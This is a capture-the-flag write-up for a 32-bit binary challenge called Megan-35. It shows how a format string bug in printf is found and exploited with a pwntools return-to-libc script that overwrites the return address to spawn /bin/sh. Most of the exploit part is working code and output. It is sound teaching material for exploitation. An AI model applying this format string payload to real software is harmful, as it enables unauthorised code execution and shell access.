**Points:** 200

**Description:**

```
We created our own Megan-35 decoding tool, feel free to test it. System is running Ubuntu 16.04, ASLR is disabled.
nc megan35.stillhackinganyway.nl 3535

megan-35 - 5f12aa57589088dc14c2d589b97b4d4d

libc.so.6 - a503ef51452760010c1dbd421ac26635
```

When working on binary exploitation challenges, I usually approach them in 3 stages.

1. **Basic Reverse Engineering** - Get a rough idea of how the binary works.
2. **Testing/Bughunting** - My testing usually begins with manual fuzzing, if I can't find the bug, I will go back and reverse engineer it further.
3. **Exploit Development** - Once I have found the bug, the real fun begins!

# Recommended Reading
For those who are new to binary exploitation, I recommend you read the following:
- String Format Exploit: [Hacking, The Art of Exploitation](https://www.nostarch.com/hacking2.htm) - Chapter 0x350
- Return-to-libc Exploit: [Whitepaper by Return Saif El-Sherei](https://www.exploit-db.com/docs/28553.pdf)

# Reverse Engineering
So this binary simply takes a string as user input, and attempts to decode it using Megan-35.  At first, I didn't realize that Megan-35 was a real encoding, but rather, I assumed it was one created for the CTF.  So I spent a lot of time attempting to reverse-engineer the encoding from the assembly.  I then had the idea that I should search Google for Megan-35.  I then stumbled upon this [Python script on Github](https://gist.github.com/tunelko/49b7e64c1688d62d0ecd).

Awesome!  A Python-based implementation for encoding/decoding strings!

# Testing/Bughunting
From the previous stage, I had noticed what appeared to be an uncontrolled printf call.  Let's verify that quickly now that we have an easy way to encode arbitrary text into Megan-35.

I encode the payload following string format into Megan-35:

```
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
```

And manually enter it into the binary:

```
$ ./megan-35 
Decrypt your text with the MEGAN-35 encryption.
Od3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQYeqTMWVOd3yoHy1RIXyQW55
0804b818.f7fce5a0.00000000.00000000.00000000.00000000.7933644f.3179486f.79584952.71655951.56574d54.7933644f.3179486f.79584952.71655951.56574d54.7933644f.3179486f.79584952.71655951.
```

Great!  We now have our bug, a classic string format vulnerability.

# Exploit Development
The first step I usually take when developing an exploit for a binary, is to run checksec on it.

```
$ checksec megan-35
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Since NX is enabled, we can't simply put a bunch of shellcode on the stack and return to that.  However, the CTF organizers were nice enough to provide us a copy of libc, a return-to-libc attack should work perfectly on this binary.

So first I will try and figure out which argument contains the beginning of my payload.  I try using the following payload:
```python
payload = ''
payload += 'AAAA'
payload += '%x.'*200
```

But I don't see a value of `41414141` get printed, it appears that this format string exceeds the max buffer.  So instead, I write a script to directly access each parameter until it finds the one that contains the first 4 bytes of our string format.

```python
def find_arg_offset():
    for i in range(0,500):
        p = getp()
        payload = ''
        payload += 'AAAA%'
        payload += str(i)
        payload += '$x'
        cipher = encode(megan35, payload)
        p.sendline(cipher)
        ret = p.recvall()
        print(ret)
        if '41414141' in ret:
            print(i)
            print('Found it!')
            return i
```

It ends up finding `41414141` at argument 71.  Combine this with the '%hn' format, and we can now overwrite arbitrary memory.

So to perform the return-to-libc attack, we will want to setup the stack as such:

```
|---+---+---+---|---+---+---+---|---+---+---+---|
 [ RETURN ADDR ] [     DUMM    ] [    PARAM1   ]
```
The reason why we have `DUMM` in between the return address and param1 is because that is the address that will get jumped to after our libc function call has completed.  I don't care to fill this in with a meaningful address because after we exit the shell, I don't care what happens to the program (it will crash).

So we really only need to overwrite 2 addresses, the return address and the parameter address.  We will point the return address to the libc function, `system` and param1 should point to the string `\bin\sh\x00`.  We could have put `\bin\sh\x00` at the end of our payload and set the parameter address to a value on the stack, but since we have to caluclate the libc address for `system`, it was just as easy to find the string `\bin\sh\x00` directly in `libc.so.6`.  To simplify this task, I used pwntools to calculate the necessary addresses.

```python
libc = ELF('./libc.so.6')
libc.address = printf_addr - libc.symbols['printf']
print('System...')
print(hexdump(libc.symbols['system']))
print('/bin/sh...')
print(hexdump(next(libc.search('/bin/sh\x00'))))
```

But on each system, libc may be loaded at a slightly different offset (but thankfully, since ASLR was disabled, libc will be loaded into the same location each time).

So to find the libc address, I first used a debugger to find what address printf was being loaded at on my local setup.  Then I dumped the values on the stack until I found one that was close to `printf`.  I discovered that argument #46 on the stack contains a value that is offset from `printf` by `0x35D3B`.  So I wrote a function to reliably deliver the printf address (assuming ASLR is disabled on the machine).

```python
def get_printf_addr():
    p = getp()
    payload = ''
    payload += 'AAAA%46$x'
    cipher = encode(megan35, payload)
    p.sendline(cipher)
    ret = p.recvall()
    ret = ret.replace('AAAA','')
    return u32(ret.decode('hex')[::-1])+0x35D3B
```

I then did something similar for finding the address on the stack containing the return address.

```python
def get_retn_addr():
    p = getp()
    payload = ''
    payload += 'AAAA%96$x'
    cipher = encode(megan35, payload)
    p.sendline(cipher)
    ret = p.recvall()
    ret = ret.replace('AAAA','')
    return u32(ret.decode('hex')[::-1])+0xc
```

Finally, I am ready to build the string format exploit.  Since `%hn` writes only 2 bytes at a time, we will have to perform a total of 4 writes to modify the 2 addresses.  I add the address with the smallest value to overwrite first ascending to the largest overwrite value.  And then I write to the arguments in the order that they are on the stack.


Here were the calculated memory addresses on the remote server:
```
System...
00000000  40 39 e5 f7                                         │@9··││
00000004
/bin/sh...
00000000  0b 20 f7 f7                                         │· ··││
00000004
```

And the final exploit code:
```python
retn_addr = get_retn_addr()
print('0x%x' % retn_addr)

p = getp()
fmt = ''
fmt += p32(retn_addr+8)
fmt += p32(retn_addr)
fmt += p32(retn_addr+2)
fmt += p32(retn_addr+8+2)
fmt += '%8187x%71$hn'
fmt += '%6453x%72$hn'
fmt += '%48805x%73$hn'
fmt += '%18x%74$hn'
    
payload = encode(megan35, fmt)
p.sendline(payload)
p.interactive()
```

And finally, we have popped a shell, now to get our flag!
